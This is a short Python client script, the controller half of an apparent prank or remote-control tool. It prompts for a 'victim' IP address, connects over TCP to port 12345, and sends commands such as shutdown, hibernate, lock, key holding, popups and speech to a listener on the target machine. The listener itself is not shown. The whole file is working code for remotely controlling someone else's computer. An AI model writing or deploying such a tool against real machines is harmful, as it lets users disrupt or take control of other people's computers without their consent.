# Client script (run on the sending computer)
import socket
import pyautogui as pg

IP_AD = pg.prompt("Enter the IP address of the victim", "Host")  # IP address of the receiver's computer

COMMANDS = ["shutdown", "quit", "hibernate", "rickroll", "hold w", "press:(key)", "desktop", "lock", "popup:(message)", "speak:(message)"]

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((IP_AD, 12345))

while True:
    try:
        message = pg.prompt(text="Type help to view availble commands.", title="Controller")
        if message != "exit":
            if message != "help":
                client.sendall(message.encode('utf-8')) # Sends the message
            else:
                for command in COMMANDS:
                    print(command)
        else:
            break

    except KeyboardInterrupt:
        break

client.close()